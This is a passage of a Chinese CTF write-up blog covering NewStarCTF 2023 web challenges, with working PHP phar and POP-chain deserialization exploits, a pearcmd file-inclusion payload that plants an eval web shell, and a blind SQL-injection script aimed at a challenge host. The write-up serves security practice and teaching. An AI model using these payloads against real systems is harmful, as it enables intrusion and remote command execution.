class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125; <span class="hljs-comment">//需要绕过__wakeup(),反序列化中__wakeup先于__destruct</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//解码后写入$pear</span><br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<span class="hljs-comment">//检查文件是否存在</span><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;多吃雪梨&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>没有<code>Unserialize</code>的反序列化，还是<code>Phar</code>。可以通过<code>__destruct</code>执行命令，但存在<code>__wakeup</code>阻碍(可以通过修改属性数量绕过)。</p><p>参考：<code>https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</code></p><p>主要就是需要修改<code>phar</code>文件的内容(属性数量)才能去绕过<code>__wakeup</code>。但注意<code>phar</code>这个东西是有签名的，我们在此基础上还要对文件签名进行修改。</p><p>先把<code>wakeup</code>放一边：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setUser</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;                 <br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">setUser</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /fl*&#x27;</span>;<span class="hljs-comment">//看了wp，看天眼了直接cat /fl*。正常做肯定要一点点执行命令：ls ls /啥的</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>hex</code>打开，修改类属性的个数为<code>5</code>(本来是4)：</p><p><img src="/img/phar12.png" alt="phar12"></p><p>这里借用<code>pankas</code>师傅的一张图：</p><p><img src="/img/phar13.png" alt="phar13"></p><p>签名类型为<code>sha1</code>，伪造签名算法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;hacker.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    f = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>() <span class="hljs-comment"># 修改内容后的phar文件,以二进制文件形式打开</span><br>    <br>s = f[:<span class="hljs-number">-28</span>] <span class="hljs-comment"># 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）</span><br>h = f[<span class="hljs-number">-8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识，各4个字节</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week3</title>
    <link href="/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/"/>
    <url>/2023/11/27/week3_Writeup_2023_NewStarCTF_Week3/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第三周，菜鸟的wp</p><span id="more"></span><hr><h2 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//过滤伪协议及flag</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.php&quot;</span>);<span class="hljs-comment">//文件包含漏洞</span><br>        <span class="hljs-comment"># Something in phpinfo.php!</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>?file=phpinfo</code>,<code>ctrl+F</code>搜索<code>FLAG</code>:</p><p><img src="/img/pear1.png" alt="pear1"></p><p>让我们去查看<code>register_argc_argv</code>:</p><p><img src="/img/pear3.png" alt="pear3"></p><p><code> register_argc_argv</code>开启时我们传入get的参数会被记录在<code>$_SERVER</code>这个全局变量数组中</p><p>并且<code>$argc</code>变量用于记录数组的大小。 <code>$argv</code>变量是用于记录输入参数。</p><p><img src="/img/pear4.png" alt="pear4"></p><p>参考P神的<code>Docker PHP裸文件本地包含综述</code>:</p><p><code>payload</code>:<code>/?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/hello.php</code></p><p><img src="/img/pearpear2.png" alt="pearpear2"></p><p>注意要在<code>bp</code>上抓包修改，因为<code>URL``get</code>传参时会把<code>&lt;&gt;</code>这种自动编码。</p><p>然后访问<code>/?file=tmp/hello</code></p><p><img src="/img/pearpear3.png" alt="pearpear3"></p><p><img src="/img/pearpear4.png" alt="pearpear4"></p><h2 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h2><p>先判断字符型还是数字型注入：</p><p><code>/?id=TMP11503&#39;--+  字符型注入</code></p><p><code>or</code>,<code>select</code>过滤了小写，<code>union</code>应该是正则匹配&#x2F;i模式过滤掉了。</p><p><code>?id=TMP0919&#39; And 1=1--+</code>正常回显，<code>?id=TMP0919&#39; And 1=0--+</code>回显<code>id not exists</code></p><p><code>/?id=TMP0919&#39; And if(length(database())&gt;1,1,0)--+</code>正常回显，<code>?id=TMP0919&#39; And if(length(database())&gt;99,1,0)--+</code>回显<code>id not exists</code></p><p>二分法+布尔盲注：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://f74c4214-b1b0-4485-b876-75128295a980.node4.buuoj.cn:81/&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br>        payload = <span class="hljs-string">&quot;TMP0919&#x27;/**/And/**/if(Ascii(Substr(Database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i, mid)<span class="hljs-comment">#ctf</span><br><span class="hljs-comment">#爆库,注意题目有过滤大小写</span><br><span class="hljs-comment">#if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#ctf</span><br><span class="hljs-comment">#爆表  grades,here_is_flag</span><br><span class="hljs-comment">#if(Ascii(Substr((Select(Group_Concat(Table_Name))From(InfOrmation_Schema.Tables)Where(Table_Schema=&#x27;ctf&#x27;)</span><br><span class="hljs-comment">#爆字段： #if(Ascii(Substr((Select(Group_Concat(Column_name))From(InfOrmation_Schema.Columns)Where(table_name=&#x27;here_is_flag&#x27;))  </span><br><span class="hljs-comment">#爆数据：</span><br><span class="hljs-comment">#if(ascii(substr((select(flag)from(here_is_flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br>        r = requests.get(url+<span class="hljs-string">&quot;?id=&quot;</span>+payload)<br>        <span class="hljs-comment">#r = requests.get(url=url,params=paylaod)</span><br>        time.sleep(<span class="hljs-number">0.03</span>)<br>        <span class="hljs-comment">#print(r.text)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;TMP0919&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure><h2 id="POP-Gadget"><a href="#POP-Gadget" class="headerlink" title="POP Gadget"></a>POP Gadget</h2><p>反序列化中的pop链构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<span class="hljs-comment">//正则匹配name中所有大小写字符及数字，这个name要是个字符串，目测要把某个类赋值给name调用__toString方法</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)//果然有个<span class="hljs-title">__toString</span>，应该要从<span class="hljs-title">__destruct</span>跳到这里</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<span class="hljs-comment">//调用 $func存储的函数，可以利用这个去调用__invoke函数</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)//在对象中调用一个不可访问方法时调用,应该要利用<span class="hljs-title">__invoke</span>跳到这里</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)//调用函数的方式调用一个对象时的回应方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<span class="hljs-comment">//unset，销毁指定变量，通过这个跳到__unset</span><br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)//当对不可访问属性调用<span class="hljs-title">unset</span>(<span class="hljs-params"></span>)时被调用</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <span class="hljs-comment">//函数执行</span><br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <span class="hljs-comment">//反序列化的尾巴</span><br><br><span class="hljs-comment">//https://zhuanlan.zhihu.com/p/377676274</span><br></code></pre></td></tr></table></figure><p>函数调用顺序：</p><p><code>Begin中的__destruct-&gt;Then中的__ToString-&gt;Super中的__invoke-&gt;Handle中的__call-&gt;CTF中的end(unset)-&gt;WhiteGod中的__unset</code></p><p><code>exp:</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br>    &#125;<br><br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span 